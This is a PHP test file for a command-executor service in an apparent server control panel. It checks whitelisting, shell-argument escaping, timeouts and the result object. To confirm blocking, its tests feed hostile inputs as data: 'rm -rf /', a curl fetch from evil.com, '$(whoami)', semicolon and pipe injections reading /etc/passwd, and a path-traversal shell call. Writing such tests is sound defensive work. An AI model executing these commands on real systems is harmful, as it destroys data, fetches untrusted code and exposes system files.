<?php

declare(strict_types=1);

use App\Services\SystemCommandExecutor;
use App\Services\CommandResult;

beforeEach(function () {
    config(['vsispanel.allowed_commands' => [
        'echo',
        'ls',
        'cat',
        'whoami',
        'php*',
        'date',
    ]]);

    config(['vsispanel.log_commands' => false]);

    $this->executor = new SystemCommandExecutor();
});

describe('SystemCommandExecutor', function () {

    it('executes allowed commands successfully', function () {
        $result = $this->executor->execute('echo', ['Hello', 'World']);

        expect($result)->toBeInstanceOf(CommandResult::class);
        expect($result->isSuccess())->toBeTrue();
        expect($result->stdout)->toContain('Hello World');
        expect($result->exitCode)->toBe(0);
    });

    it('blocks commands not in whitelist', function () {
        $result = $this->executor->execute('rm', ['-rf', '/']);

        expect($result->isSuccess())->toBeFalse();
        expect($result->stderr)->toContain('not allowed');
    });

    it('blocks dangerous commands', function () {
        $result = $this->executor->execute('curl', ['http://evil.com/script.sh']);

        expect($result->isSuccess())->toBeFalse();
        expect($result->stderr)->toContain('not allowed');
    });

    it('escapes shell arguments properly', function () {
        $result = $this->executor->execute('echo', ['$(whoami)']);

        // Should NOT execute the nested command, just print it literally
        expect($result->stdout)->toContain('$(whoami)');
        expect($result->stdout)->not->toBe(trim(shell_exec('whoami')));
    });

    it('escapes semicolon injection attempts', function () {
        $result = $this->executor->execute('echo', ['hello; rm -rf /']);

        expect($result->isSuccess())->toBeTrue();
        expect($result->stdout)->toContain('hello; rm -rf /');
    });

    it('escapes pipe injection attempts', function () {
        $result = $this->executor->execute('echo', ['hello | cat /etc/passwd']);

        expect($result->isSuccess())->toBeTrue();
        expect($result->stdout)->toContain('hello | cat /etc/passwd');
    });

    it('supports wildcard matching in allowed commands', function () {
        // php* should match php, php8.3, etc.
        $result = $this->executor->execute('php', ['-v']);

        expect($result->isSuccess())->toBeTrue();
        expect($result->stdout)->toContain('PHP');
    });

    it('returns proper CommandResult object', function () {
        $result = $this->executor->execute('echo', ['test']);

        expect($result)->toBeInstanceOf(CommandResult::class);
        expect($result->toArray())->toHaveKeys([
            'success',
            'exit_code',
            'stdout',
            'stderr',
            'execution_time',
        ]);
    });

    it('captures stderr on command failure', function () {
        $result = $this->executor->execute('ls', ['/nonexistent_directory_12345']);

        expect($result->isSuccess())->toBeFalse();
        expect($result->stderr)->not->toBeEmpty();
    });

    it('respects command timeout', function () {
        // Create executor with very short timeout
        config(['vsispanel.command_timeout' => 1]);
        $executor = new SystemCommandExecutor();

        // This should timeout (sleep is allowed as it's a common command)
        config(['vsispanel.allowed_commands' => ['sleep']]);
        $executor = new SystemCommandExecutor();

        $result = $executor->execute('sleep', ['10']);

        expect($result->isSuccess())->toBeFalse();
        expect($result->stderr)->toContain('timed out');
    })->skip(fn() => true, 'Skip slow timeout test');

    it('can check if command exists', function () {
        expect($this->executor->commandExists('ls'))->toBeTrue();
        expect($this->executor->commandExists('nonexistent_command_xyz'))->toBeFalse();
    });

    it('returns allowed commands list', function () {
        $commands = $this->executor->getAllowedCommands();

        expect($commands)->toBeArray();
        expect($commands)->toContain('echo');
        expect($commands)->toContain('ls');
    });

    it('blocks path traversal in command names', function () {
        $result = $this->executor->execute('../../../bin/sh', ['-c', 'echo pwned']);

        expect($result->isSuccess())->toBeFalse();
    });

});

describe('CommandResult', function () {

    it('creates success result correctly', function () {
        $result = CommandResult::success('output text', 0.5);

        expect($result->isSuccess())->toBeTrue();
        expect($result->getOutput())->toBe('output text');
        expect($result->getError())->toBe('');
        expect($result->exitCode)->toBe(0);
        expect($result->executionTime)->toBe(0.5);
    });

    it('creates failed result correctly', function () {
        $result = CommandResult::failed('error message', 0.3);

        expect($result->isSuccess())->toBeFalse();
        expect($result->getError())->toBe('error message');
        expect($result->exitCode)->toBe(1);
    });

    it('gets output lines as array', function () {
        $result = new CommandResult(
            success: true,
            exitCode: 0,
            stdout: "line1\nline2\nline3",
            stderr: '',
            executionTime: 0.1
        );

        $lines = $result->getOutputLines();

        expect($lines)->toBe(['line1', 'line2', 'line3']);
    });

    it('converts to array correctly', function () {
        $result = new CommandResult(
            success: true,
            exitCode: 0,
            stdout: 'output',
            stderr: 'error',
            executionTime: 1.5
        );

        $array = $result->toArray();

        expect($array)->toBe([
            'success' => true,
            'exit_code' => 0,
            'stdout' => 'output',
            'stderr' => 'error',
            'execution_time' => 1.5,
        ]);
    });

});
